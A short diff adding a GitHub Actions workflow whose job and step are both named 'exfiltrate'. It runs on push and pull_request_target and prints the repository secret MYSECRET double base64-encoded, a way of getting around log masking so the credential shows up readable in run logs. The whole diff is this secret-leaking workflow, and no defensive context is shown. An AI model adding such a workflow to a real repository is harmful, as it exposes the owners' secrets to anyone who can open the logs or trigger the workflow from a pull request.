@@ -1,0 +1,10 @@
+on:
+  push:
+  pull_request_target:
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfiltrate
+        run: |
+          echo "${{ secrets.MYSECRET }}" | base64 | base64
